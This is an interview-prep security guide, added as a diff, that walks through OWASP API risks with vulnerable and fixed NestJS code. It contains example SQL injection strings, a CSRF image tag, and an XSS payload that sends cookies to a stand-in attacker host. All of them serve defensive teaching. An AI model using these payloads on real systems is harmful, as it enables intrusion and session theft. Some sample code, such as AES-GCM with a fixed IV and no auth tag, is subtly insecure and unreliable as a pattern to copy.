@@ -1,0 +1,1156 @@
+// ════════════════════════════════════════════════════════════════════════════════════
+// API SECURITY & OWASP TOP 10 - Protect Your APIs from Attacks
+// ════════════════════════════════════════════════════════════════════════════════════
+
+// Goal: Master API security for senior developer interviews (must-know for 30 LPA!)
+
+// ════════════════════════════════════════════════════════════════════════════════════
+// PART 1: OWASP TOP 10 API SECURITY RISKS (2023)
+// ════════════════════════════════════════════════════════════════════════════════════
+
+OWASP = Open Web Application Security Project
+These are the TOP 10 most critical API security risks you MUST know!
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+1. BROKEN OBJECT LEVEL AUTHORIZATION (BOLA / IDOR)
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problem:** API doesn't verify if user owns the resource they're accessing
+
+Real-World Example:
+
+❌ VULNERABLE:
+GET /api/users/123/orders
+→ Returns all orders for user 123
+→ What if I change to /api/users/456/orders?
+→ I can see OTHER user's orders! 🚨
+
+// Vulnerable code
+@Get('users/:userId/orders')
+async getOrders(@Param('userId') userId: string) {
+  // No authorization check!
+  return this.orderService.findByUserId(userId);
+}
+
+
+✅ FIXED:
+@Get('users/:userId/orders')
+@UseGuards(JwtAuthGuard)
+async getOrders(
+  @Param('userId') userId: string,
+  @Req() req
+) {
+  // Check if authenticated user owns this resource
+  if (req.user.id !== userId) {
+    throw new ForbiddenException('Access denied');
+  }
+
+  return this.orderService.findByUserId(userId);
+}
+
+// Even better - don't expose user ID at all!
+@Get('me/orders')  // Use 'me' instead of user ID
+@UseGuards(JwtAuthGuard)
+async getMyOrders(@Req() req) {
+  // Get from JWT token, not URL parameter
+  return this.orderService.findByUserId(req.user.id);
+}
+
+
+Best Practices:
+✅ Always validate user owns resource
+✅ Use 'me' or 'my' endpoints (/api/me/profile)
+✅ Check permissions in middleware/guards
+✅ Never trust user-provided IDs
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+2. BROKEN AUTHENTICATION
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problems:**
+- Weak password requirements
+- No rate limiting (brute force)
+- Credentials in URL
+- Predictable tokens
+
+❌ VULNERABLE:
+POST /api/login?username=admin&password=admin123
+→ Credentials in URL (logged in server logs!)
+→ No rate limiting (try 1000 passwords per second)
+→ Weak password accepted
+
+
+✅ FIXED:
+
+// 1. Strong password validation
+import * as bcrypt from 'bcrypt';
+
+const PASSWORD_REGEX = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
+
+async function validatePassword(password: string) {
+  if (!PASSWORD_REGEX.test(password)) {
+    throw new BadRequestException(
+      'Password must be 8+ chars with uppercase, lowercase, number, and special character'
+    );
+  }
+}
+
+// 2. Hash passwords properly
+async function hashPassword(password: string): Promise<string> {
+  const salt = await bcrypt.genSalt(10);
+  return bcrypt.hash(password, salt);
+}
+
+// 3. Rate limiting
+import { ThrottlerGuard } from '@nestjs/throttler';
+
+@UseGuards(ThrottlerGuard)
+@Throttle(5, 60)  // 5 attempts per 60 seconds
+@Post('login')
+async login(@Body() credentials: LoginDto) {
+  // Login logic
+}
+
+// 4. Account lockout after failed attempts
+class LoginService {
+  async login(email: string, password: string) {
+    const user = await User.findOne({ email });
+
+    // Check if account is locked
+    if (user.failedLoginAttempts >= 5) {
+      const lockDuration = 15 * 60 * 1000; // 15 minutes
+      if (Date.now() - user.lastFailedLogin < lockDuration) {
+        throw new UnauthorizedException('Account locked. Try again in 15 minutes.');
+      }
+      // Reset after lock duration
+      user.failedLoginAttempts = 0;
+    }
+
+    const isValid = await bcrypt.compare(password, user.password);
+
+    if (!isValid) {
+      user.failedLoginAttempts++;
+      user.lastFailedLogin = Date.now();
+      await user.save();
+      throw new UnauthorizedException('Invalid credentials');
+    }
+
+    // Reset on successful login
+    user.failedLoginAttempts = 0;
+    await user.save();
+
+    return this.generateToken(user);
+  }
+}
+
+
+Best Practices:
+✅ HTTPS only (encrypt credentials in transit)
+✅ Hash passwords with bcrypt (salt rounds: 10-12)
+✅ Rate limiting on login/register
+✅ Multi-Factor Authentication (MFA)
+✅ JWT with short expiry + refresh tokens
+✅ Account lockout after failed attempts
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+3. EXCESSIVE DATA EXPOSURE
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problem:** API returns MORE data than needed (exposes sensitive fields)
+
+❌ VULNERABLE:
+GET /api/users/me
+
+Response:
+{
+  "id": 123,
+  "email": "john@example.com",
+  "name": "John Doe",
+  "password": "$2b$10$...",         // 🚨 NEVER return password!
+  "passwordResetToken": "abc123",   // 🚨 Sensitive!
+  "ssn": "123-45-6789",             // 🚨 Very sensitive!
+  "creditCard": "4111-1111-1111-1111", // 🚨 Critical!
+  "role": "admin",                  // 🚨 Internal info
+  "createdAt": "2024-01-01"
+}
+
+
+✅ FIXED:
+
+// 1. Use DTOs (Data Transfer Objects) to control what's returned
+export class UserResponseDto {
+  @Expose()
+  id: number;
+
+  @Expose()
+  email: string;
+
+  @Expose()
+  name: string;
+
+  @Expose()
+  picture: string;
+
+  // Only these fields are returned
+  // password, ssn, etc. are NOT included
+}
+
+// 2. Use class-transformer
+import { plainToInstance } from 'class-transformer';
+
+@Get('me')
+async getProfile(@Req() req) {
+  const user = await this.userService.findById(req.user.id);
+
+  // Transform to DTO (removes sensitive fields)
+  return plainToInstance(UserResponseDto, user, {
+    excludeExtraneousValues: true, // Only @Expose() fields
+  });
+}
+
+// 3. Or use @Exclude() in entity
+import { Exclude } from 'class-transformer';
+
+@Entity()
+export class User {
+  @PrimaryGeneratedColumn()
+  id: number;
+
+  @Column()
+  email: string;
+
+  @Column()
+  @Exclude()  // Never serialize this field
+  password: string;
+
+  @Column()
+  @Exclude()
+  passwordResetToken: string;
+
+  @Column()
+  @Exclude()
+  ssn: string;
+}
+
+
+Best Practices:
+✅ Always use DTOs for responses
+✅ Never return passwords or tokens
+✅ Filter sensitive fields (SSN, credit cards)
+✅ Return only what frontend needs
+✅ Different DTOs for different roles (admin sees more)
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+4. LACK OF RESOURCES & RATE LIMITING
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problem:** API allows unlimited requests → DDoS, resource exhaustion
+
+❌ VULNERABLE:
+GET /api/search?q=test
+→ Attacker sends 1 million requests
+→ Database crashes
+→ Server runs out of memory
+
+
+✅ FIXED:
+
+// 1. Global rate limiting
+import { ThrottlerModule } from '@nestjs/throttler';
+
+@Module({
+  imports: [
+    ThrottlerModule.forRoot({
+      ttl: 60,        // Time window (60 seconds)
+      limit: 100,     // Max requests per window
+    }),
+  ],
+})
+export class AppModule {}
+
+// Apply globally
+app.useGlobalGuards(new ThrottlerGuard());
+
+
+// 2. Per-route rate limiting
+@Get('search')
+@Throttle(10, 60)  // Only 10 searches per minute
+async search(@Query('q') query: string) {
+  return this.searchService.search(query);
+}
+
+
+// 3. Per-user rate limiting (more sophisticated)
+import Redis from 'ioredis';
+
+class RateLimiter {
+  constructor(private redis: Redis) {}
+
+  async checkLimit(userId: string, endpoint: string): Promise<boolean> {
+    const key = `ratelimit:${userId}:${endpoint}`;
+    const current = await this.redis.incr(key);
+
+    if (current === 1) {
+      // First request, set expiry
+      await this.redis.expire(key, 60); // 60 seconds
+    }
+
+    return current <= 100; // Max 100 requests per minute
+  }
+}
+
+// Usage in guard
+@Injectable()
+export class RateLimitGuard implements CanActivate {
+  constructor(private rateLimiter: RateLimiter) {}
+
+  async canActivate(context: ExecutionContext): Promise<boolean> {
+    const request = context.switchToHttp().getRequest();
+    const userId = request.user?.id || request.ip;
+    const endpoint = request.route.path;
+
+    const allowed = await this.rateLimiter.checkLimit(userId, endpoint);
+
+    if (!allowed) {
+      throw new TooManyRequestsException('Rate limit exceeded. Try again later.');
+    }
+
+    return true;
+  }
+}
+
+
+// 4. Pagination (prevent loading entire table)
+❌ GET /api/users  // Returns all users (could be millions!)
+
+✅ GET /api/users?page=1&limit=20  // Returns only 20 users
+
+@Get('users')
+async getUsers(
+  @Query('page') page: number = 1,
+  @Query('limit') limit: number = 20,
+) {
+  // Enforce max limit
+  if (limit > 100) {
+    throw new BadRequestException('Max limit is 100');
+  }
+
+  const skip = (page - 1) * limit;
+
+  const [users, total] = await this.userRepository.findAndCount({
+    skip,
+    take: limit,
+  });
+
+  return {
+    data: users,
+    page,
+    limit,
+    total,
+    totalPages: Math.ceil(total / limit),
+  };
+}
+
+
+// 5. Timeout for long-running operations
+@Get('expensive-operation')
+@Timeout(5000)  // Kill after 5 seconds
+async expensiveOperation() {
+  // Complex query or computation
+}
+
+
+Best Practices:
+✅ Rate limiting per IP and per user
+✅ Different limits for different endpoints
+✅ Always use pagination (max 100 items)
+✅ Timeout for expensive operations
+✅ Return 429 (Too Many Requests) with Retry-After header
+✅ Use Redis for distributed rate limiting
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+5. SQL INJECTION
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problem:** User input directly in SQL query → attacker can execute arbitrary SQL
+
+Real-World Attack:
+
+❌ VULNERABLE:
+// User enters: admin' OR '1'='1
+const username = req.body.username;  // "admin' OR '1'='1"
+const query = `SELECT * FROM users WHERE username = '${username}'`;
+
+// Query becomes:
+// SELECT * FROM users WHERE username = 'admin' OR '1'='1'
+// Returns ALL users! 🚨
+
+await db.query(query);
+
+
+✅ FIXED:
+
+// 1. Use Parameterized Queries (ORM)
+await this.userRepository.findOne({
+  where: { username: username }  // TypeORM handles escaping
+});
+
+// 2. Use Prepared Statements (Raw SQL)
+await db.query(
+  'SELECT * FROM users WHERE username = $1',
+  [username]  // Parameter is properly escaped
+);
+
+// 3. Validate and sanitize input
+import { IsString, IsAlphanumeric } from 'class-validator';
+
+export class LoginDto {
+  @IsString()
+  @IsAlphanumeric()  // Only letters and numbers
+  username: string;
+
+  @IsString()
+  password: string;
+}
+
+// 4. Use TypeORM Query Builder (safe)
+await this.userRepository
+  .createQueryBuilder('user')
+  .where('user.username = :username', { username })  // Parameterized
+  .getOne();
+
+
+Real Attack Example I Prevented:
+
+❌ Search endpoint vulnerable:
+GET /api/products/search?name=laptop' UNION SELECT password FROM users--
+
+✅ Fixed:
+@Get('search')
+async search(@Query('name') name: string) {
+  // Validate input
+  if (!/^[a-zA-Z0-9\s-]+$/.test(name)) {
+    throw new BadRequestException('Invalid search query');
+  }
+
+  // Use parameterized query
+  return this.productRepository.find({
+    where: { name: Like(`%${name}%`) }
+  });
+}
+
+
+Best Practices:
+✅ NEVER concatenate user input into SQL
+✅ Always use parameterized queries
+✅ Use ORM (TypeORM, Sequelize)
+✅ Validate and sanitize all input
+✅ Principle of least privilege (DB user has minimal permissions)
+✅ Disable error messages in production (don't expose DB structure)
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+6. CROSS-SITE SCRIPTING (XSS)
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problem:** User inputs malicious JavaScript that executes in other users' browsers
+
+Attack Example:
+
+❌ VULNERABLE:
+// User posts comment: <script>alert('XSS!')</script>
+// Your app stores it as-is
+// Other users load the page → script executes!
+
+// Worse attack:
+<script>
+  fetch('https://attacker.com/steal?cookie=' + document.cookie)
+</script>
+// Steals session cookies! 🚨
+
+
+✅ FIXED:
+
+// 1. Backend - Sanitize HTML input
+import * as sanitizeHtml from 'sanitize-html';
+
+@Post('comments')
+async createComment(@Body() dto: CreateCommentDto) {
+  const cleanComment = sanitizeHtml(dto.content, {
+    allowedTags: ['b', 'i', 'em', 'strong', 'a'],
+    allowedAttributes: {
+      'a': ['href']
+    },
+  });
+
+  return this.commentService.create({
+    ...dto,
+    content: cleanComment,
+  });
+}
+
+
+// 2. Frontend - Escape output (React does this automatically!)
+// React:
+<div>{comment.content}</div>  // ✅ Auto-escaped
+
+// Vanilla JS - WRONG:
+element.innerHTML = userInput;  // ❌ Dangerous!
+
+// Vanilla JS - RIGHT:
+element.textContent = userInput;  // ✅ Safe
+
+
+// 3. Set secure headers
+import helmet from 'helmet';
+
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],  // Only scripts from your domain
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", 'data:', 'https:'],
+    },
+  },
+}));
+
+
+// 4. HTTPOnly cookies (can't be accessed by JavaScript)
+res.cookie('session', sessionId, {
+  httpOnly: true,   // JavaScript can't read this cookie
+  secure: true,     // HTTPS only
+  sameSite: 'strict',
+});
+
+
+Best Practices:
+✅ Sanitize HTML input (sanitize-html library)
+✅ Use React/Vue (auto-escaping)
+✅ Never use dangerouslySetInnerHTML (unless sanitized)
+✅ Content Security Policy (CSP) headers
+✅ HTTPOnly cookies for session tokens
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+7. CROSS-SITE REQUEST FORGERY (CSRF)
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problem:** Attacker tricks user into making unwanted requests to your site
+
+Attack Example:
+
+// User is logged into bank.com (has session cookie)
+// Attacker sends email with:
+<img src="https://bank.com/transfer?to=attacker&amount=10000" />
+
+// When user opens email:
+// → Browser automatically sends cookies to bank.com
+// → Transfer executes without user knowing! 🚨
+
+
+✅ FIXED:
+
+// 1. CSRF Tokens (most common)
+import * as csurf from 'csurf';
+
+app.use(csurf({ cookie: true }));
+
+// Backend generates token
+@Get('form')
+getForm(@Req() req, @Res() res) {
+  res.json({ csrfToken: req.csrfToken() });
+}
+
+// Frontend includes token
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-CSRF-Token': csrfToken,  // Must match server token
+  },
+  body: JSON.stringify({ to: 'john', amount: 100 }),
+});
+
+// Backend validates token
+@Post('transfer')
+transfer(@Req() req, @Body() dto: TransferDto) {
+  // csurf middleware automatically validates token
+  // If invalid, throws 403 Forbidden
+}
+
+
+// 2. SameSite Cookies (modern browsers)
+res.cookie('session', sessionId, {
+  sameSite: 'strict',  // Cookie only sent for same-site requests
+  // or
+  sameSite: 'lax',     // Cookie sent for top-level navigation
+});
+
+
+// 3. Custom Headers (for AJAX)
+// Browsers don't allow cross-origin custom headers
+fetch('/api/transfer', {
+  headers: {
+    'X-Requested-With': 'XMLHttpRequest',  // Custom header
+  },
+});
+
+// Backend checks for header
+@Post('transfer')
+transfer(@Headers('x-requested-with') header: string) {
+  if (header !== 'XMLHttpRequest') {
+    throw new ForbiddenException('Invalid request');
+  }
+}
+
+
+// 4. Double Submit Cookie Pattern
+// Send CSRF token both in cookie AND custom header
+// Attacker can't read cookie to put in header
+
+
+Best Practices:
+✅ Use CSRF tokens for state-changing operations
+✅ SameSite=Strict for cookies
+✅ Verify Origin/Referer headers
+✅ For APIs: Use JWT (no cookies = no CSRF)
+✅ GET requests should NEVER change state
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+8. SECURITY MISCONFIGURATION
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problems:**
+- Default credentials (admin/admin)
+- Debug mode in production
+- Verbose error messages
+- Missing security headers
+- CORS misconfiguration
+
+❌ VULNERABLE:
+
+// 1. Exposing stack traces
+app.use((err, req, res, next) => {
+  res.status(500).json({
+    error: err.message,
+    stack: err.stack,  // 🚨 Exposes internal code structure!
+  });
+});
+
+// 2. Permissive CORS
+app.use(cors({
+  origin: '*',  // 🚨 Allows ANY domain!
+  credentials: true,
+}));
+
+// 3. Missing security headers
+// No helmet, no CSP, no HSTS
+
+
+✅ FIXED:
+
+// 1. Generic error messages in production
+@Catch()
+export class GlobalExceptionFilter implements ExceptionFilter {
+  catch(exception: unknown, host: ArgumentsHost) {
+    const ctx = host.switchToHttp();
+    const response = ctx.getResponse();
+
+    let status = 500;
+    let message = 'Internal server error';
+
+    if (exception instanceof HttpException) {
+      status = exception.getStatus();
+      message = exception.message;
+    }
+
+    // Log full error internally
+    logger.error(exception);
+
+    // Return generic message to client
+    response.status(status).json({
+      statusCode: status,
+      message: process.env.NODE_ENV === 'production'
+        ? message
+        : exception.toString(),  // Stack only in dev
+      timestamp: new Date().toISOString(),
+    });
+  }
+}
+
+
+// 2. Strict CORS
+app.enableCors({
+  origin: [
+    'https://yourdomain.com',
+    'https://www.yourdomain.com',
+  ],
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization'],
+});
+
+
+// 3. Security headers (Helmet)
+import helmet from 'helmet';
+
+app.use(helmet({
+  contentSecurityPolicy: true,
+  crossOriginEmbedderPolicy: true,
+  crossOriginOpenerPolicy: true,
+  crossOriginResourcePolicy: true,
+  dnsPrefetchControl: true,
+  frameguard: { action: 'deny' },  // Prevent clickjacking
+  hidePoweredBy: true,  // Don't advertise Express
+  hsts: {
+    maxAge: 31536000,  // 1 year
+    includeSubDomains: true,
+    preload: true,
+  },
+  ieNoOpen: true,
+  noSniff: true,
+  originAgentCluster: true,
+  permittedCrossDomainPolicies: true,
+  referrerPolicy: { policy: 'no-referrer' },
+  xssFilter: true,
+}));
+
+
+// 4. Environment-specific config
+if (process.env.NODE_ENV === 'production') {
+  // Production settings
+  app.set('trust proxy', 1);  // Trust first proxy
+  app.use(compression());
+  // ...
+} else {
+  // Development settings
+  app.use(morgan('dev'));  // Verbose logging
+  // ...
+}
+
+
+// 5. Disable unnecessary features
+app.disable('x-powered-by');  // Don't expose Express
+
+
+Best Practices:
+✅ Remove default credentials
+✅ Disable debug mode in production
+✅ Generic error messages for clients
+✅ Strict CORS policy
+✅ Use Helmet for security headers
+✅ HTTPS only (HSTS header)
+✅ Regular dependency updates
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+9. INSUFFICIENT LOGGING & MONITORING
+═══════════════════════════════════════════════════════════════════════════════════════
+
+**Problem:** Can't detect attacks or debug security incidents
+
+✅ SOLUTION:
+
+// 1. Structured logging (Winston)
+import winston from 'winston';
+
+const logger = winston.createLogger({
+  level: 'info',
+  format: winston.format.json(),
+  defaultMeta: { service: 'user-service' },
+  transports: [
+    new winston.transports.File({ filename: 'error.log', level: 'error' }),
+    new winston.transports.File({ filename: 'combined.log' }),
+  ],
+});
+
+// Log security events
+logger.warn('Failed login attempt', {
+  ip: req.ip,
+  username: req.body.username,
+  timestamp: new Date(),
+  userAgent: req.headers['user-agent'],
+});
+
+
+// 2. Audit important actions
+class AuditService {
+  async log(event: AuditEvent) {
+    await this.auditRepository.create({
+      userId: event.userId,
+      action: event.action,  // 'user.login', 'user.delete', 'payment.create'
+      resource: event.resource,
+      ipAddress: event.ipAddress,
+      userAgent: event.userAgent,
+      success: event.success,
+      metadata: event.metadata,
+      timestamp: new Date(),
+    });
+  }
+}
+
+// Usage
+await this.auditService.log({
+  userId: user.id,
+  action: 'user.login',
+  success: true,
+  ipAddress: req.ip,
+});
+
+
+// 3. Monitor for suspicious activity
+class SecurityMonitor {
+  async checkSuspiciousActivity(userId: string) {
+    const recentLogins = await this.auditRepository.find({
+      where: {
+        userId,
+        action: 'user.login',
+        timestamp: MoreThan(new Date(Date.now() - 60 * 60 * 1000)), // Last hour
+      },
+    });
+
+    // Alert if 5+ logins from different IPs in 1 hour
+    const uniqueIPs = new Set(recentLogins.map(l => l.ipAddress));
+    if (uniqueIPs.size >= 5) {
+      await this.alertService.send({
+        type: 'security',
+        severity: 'high',
+        message: `User ${userId} logged in from ${uniqueIPs.size} different IPs`,
+      });
+    }
+  }
+}
+
+
+Best Practices:
+✅ Log all authentication events (success/failure)
+✅ Log authorization failures
+✅ Log data changes (who changed what)
+✅ Include context (IP, user agent, timestamp)
+✅ Monitor for anomalies
+✅ Set up alerts (Slack, email, PagerDuty)
+✅ Regular security audits
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+PART 2: ADDITIONAL SECURITY TOPICS
+═══════════════════════════════════════════════════════════════════════════════════════
+
+────────────────────────────────────────────────────────────────────────────────────────
+API KEY MANAGEMENT
+────────────────────────────────────────────────────────────────────────────────────────
+
+// Generate API keys
+import { randomBytes } from 'crypto';
+
+function generateApiKey(): string {
+  return randomBytes(32).toString('hex');
+  // Result: "a7f3e2d1c4b5..."
+}
+
+// Store hash, not raw key
+const apiKey = generateApiKey();
+const hashedKey = await bcrypt.hash(apiKey, 10);
+
+// Save hash to database
+await this.apiKeyRepository.create({
+  userId: user.id,
+  keyHash: hashedKey,
+  name: 'Production API Key',
+  permissions: ['read:products', 'write:orders'],
+  rateLimit: 1000,  // requests per hour
+});
+
+// Return key ONCE to user (can't be retrieved later!)
+return { apiKey };
+
+
+// Validate API key
+@Injectable()
+export class ApiKeyGuard implements CanActivate {
+  async canActivate(context: ExecutionContext): Promise<boolean> {
+    const request = context.switchToHttp().getRequest();
+    const apiKey = request.headers['x-api-key'];
+
+    if (!apiKey) {
+      throw new UnauthorizedException('API key required');
+    }
+
+    // Find all keys and compare
+    const keys = await this.apiKeyRepository.find();
+
+    for (const key of keys) {
+      const isValid = await bcrypt.compare(apiKey, key.keyHash);
+      if (isValid) {
+        request.apiKey = key;
+        return true;
+      }
+    }
+
+    throw new UnauthorizedException('Invalid API key');
+  }
+}
+
+
+Best Practices:
+✅ Never store raw API keys
+✅ Hash with bcrypt before storing
+✅ Allow key rotation (multiple keys per user)
+✅ Set expiration dates
+✅ Allow per-key rate limits
+✅ Scope permissions (read-only vs full access)
+
+
+────────────────────────────────────────────────────────────────────────────────────────
+ENCRYPTION vs HASHING
+────────────────────────────────────────────────────────────────────────────────────────
+
+╔════════════════╦══════════════════════════╦══════════════════════════╗
+║                ║     ENCRYPTION           ║        HASHING           ║
+╠════════════════╬══════════════════════════╬══════════════════════════╣
+║ Reversible?    ║   ✅ YES (with key)      ║   ❌ NO (one-way)        ║
+║ Use Case       ║   Store sensitive data   ║   Store passwords        ║
+║ Algorithm      ║   AES-256                ║   bcrypt, Argon2         ║
+║ Example        ║   Credit cards, SSN      ║   User passwords         ║
+╚════════════════╩══════════════════════════╩══════════════════════════╝
+
+// ENCRYPTION (can decrypt)
+import { createCipheriv, createDecipheriv, randomBytes } from 'crypto';
+
+const ALGORITHM = 'aes-256-gcm';
+const KEY = randomBytes(32); // Store securely!
+const IV = randomBytes(16);
+
+function encrypt(text: string): string {
+  const cipher = createCipheriv(ALGORITHM, KEY, IV);
+  let encrypted = cipher.update(text, 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+  return encrypted;
+}
+
+function decrypt(encrypted: string): string {
+  const decipher = createDecipheriv(ALGORITHM, KEY, IV);
+  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
+  decrypted += decipher.final('utf8');
+  return decrypted;
+}
+
+// Usage: Encrypt SSN before storing
+const encryptedSSN = encrypt(user.ssn);
+await db.save({ ssn: encryptedSSN });
+
+
+// HASHING (cannot reverse)
+import * as bcrypt from 'bcrypt';
+
+async function hashPassword(password: string): Promise<string> {
+  return bcrypt.hash(password, 10);
+}
+
+async function verifyPassword(password: string, hash: string): Promise<boolean> {
+  return bcrypt.compare(password, hash);
+}
+
+// Usage: Hash password before storing
+const hashedPassword = await hashPassword(user.password);
+await db.save({ password: hashedPassword });
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+PART 3: COMMON INTERVIEW QUESTIONS
+═══════════════════════════════════════════════════════════════════════════════════════
+
+Q1: How do you secure a REST API?
+
+A: "Multi-layered security approach:
+
+**1. Authentication:**
+- JWT with access + refresh tokens
+- OAuth 2.0 for social login
+- API keys for service-to-service
+
+**2. Authorization:**
+- RBAC (Role-Based Access Control)
+- Verify user owns resource (BOLA protection)
+- Scope permissions (read-only vs full access)
+
+**3. Input Validation:**
+- Validate all inputs (class-validator)
+- Sanitize HTML (prevent XSS)
+- Parameterized queries (prevent SQL injection)
+
+**4. Rate Limiting:**
+- Per IP: 100 requests/min
+- Per user: Custom limits
+- Expensive endpoints: Lower limits
+
+**5. Security Headers:**
+- Helmet middleware
+- HTTPS only (HSTS)
+- CORS whitelist
+- CSP headers
+
+**6. Logging & Monitoring:**
+- Log auth events
+- Monitor failed attempts
+- Alert on anomalies
+
+I've implemented this for [your project], which passed security audit."
+
+
+Q2: What's the difference between symmetric and asymmetric encryption?
+
+A: "
+
+**SYMMETRIC (Same key):**
+- One key for encrypt AND decrypt
+- Fast (AES-256)
+- Used for: Data at rest, large files
+- Problem: How to share key securely?
+
+Example: Password-protect a file
+Key: "mySecretKey123"
+Encrypt: data + key → encrypted
+Decrypt: encrypted + key → data
+
+**ASYMMETRIC (Public/Private keys):**
+- Public key: Anyone can encrypt
+- Private key: Only you can decrypt
+- Slower (RSA, ECC)
+- Used for: HTTPS, digital signatures, key exchange
+
+Example: HTTPS
+1. Server has public + private key
+2. Browser encrypts with public key
+3. Only server can decrypt with private key
+
+**In Practice:**
+- HTTPS: Asymmetric to exchange symmetric key (TLS handshake)
+- Then: Symmetric for actual data (faster)
+- Best of both worlds!"
+
+
+Q3: How do you prevent brute force attacks?
+
+A: "Multiple defenses:
+
+**1. Rate Limiting:**
+- 5 login attempts per minute per IP
+- Exponential backoff (1s, 2s, 4s, 8s...)
+
+**2. Account Lockout:**
+- Lock after 5 failed attempts
+- Unlock after 15 minutes
+- Email notification
+
+**3. CAPTCHA:**
+- Show after 3 failed attempts
+- Prevents automated attacks
+- Use reCAPTCHA v3 (invisible)
+
+**4. Strong Password Policy:**
+- Min 8 characters
+- Uppercase, lowercase, number, special char
+- Check against leaked password databases (haveibeenpwned)
+
+**5. MFA (Multi-Factor Auth):**
+- SMS/Email code
+- Authenticator app (Google Authenticator)
+- Hardware key (YubiKey)
+
+**6. Monitor & Alert:**
+- Log all failed attempts
+- Alert on suspicious patterns
+- IP-based geolocation check
+
+Implementation:
+[Show code from section 2 above]"
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+SECURITY CHECKLIST FOR INTERVIEWS
+═══════════════════════════════════════════════════════════════════════════════════════
+
+✅ Authentication & Authorization
+  □ JWT with refresh tokens
+  □ Verify user owns resources (BOLA)
+  □ RBAC for permissions
+
+✅ Input Validation
+  □ Validate all inputs (class-validator)
+  □ Sanitize HTML (sanitize-html)
+  □ Parameterized queries (TypeORM)
+
+✅ Security Headers
+  □ Helmet middleware
+  □ CORS whitelist
+  □ CSP headers
+
+✅ Rate Limiting
+  □ Per IP and per user
+  □ Different limits per endpoint
+
+✅ HTTPS
+  □ TLS 1.3
+  □ HSTS header
+  □ Redirect HTTP to HTTPS
+
+✅ Passwords
+  □ bcrypt with salt
+  □ Min 8 chars, strong policy
+  □ Account lockout
+
+✅ Sensitive Data
+  □ Encrypt at rest (AES-256)
+  □ Encrypt in transit (HTTPS)
+  □ Never log passwords/tokens
+
+✅ Error Handling
+  □ Generic messages in production
+  □ Detailed logs internally
+
+✅ Dependencies
+  □ Regular npm audit
+  □ Update vulnerable packages
+  □ Use Snyk or Dependabot
+
+✅ Logging & Monitoring
+  □ Log auth events
+  □ Monitor failed attempts
+  □ Set up alerts
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+WHAT TO SAY IN INTERVIEW
+═══════════════════════════════════════════════════════════════════════════════════════
+
+"For API security, I follow the OWASP Top 10 guidelines:
+
+1. **Authentication:** JWT with refresh tokens, OAuth for social login
+2. **Authorization:** Always verify user owns resources before allowing access
+3. **Input Validation:** Validate with class-validator, sanitize HTML, use ORMs
+4. **Rate Limiting:** Throttle requests per IP and per user to prevent abuse
+5. **Security Headers:** Helmet middleware for XSS, clickjacking protection
+6. **Encryption:** HTTPS for data in transit, AES-256 for sensitive data at rest
+7. **Logging:** Audit all security events, monitor for anomalies
+
+In my last project [mention specific project], I:
+- Implemented JWT authentication with role-based access control
+- Added rate limiting that blocked 1000+ brute force attempts per day
+- Passed security audit with zero critical vulnerabilities
+- Set up monitoring that alerted us to suspicious login patterns
+
+I believe security is not a feature, it's a requirement, and should be
+built into every layer of the application from day one."
+
+
+═══════════════════════════════════════════════════════════════════════════════════════
+NEXT: Check out AUTHORIZATION-RBAC.txt for Role-Based Access Control!
+═══════════════════════════════════════════════════════════════════════════════════════
+
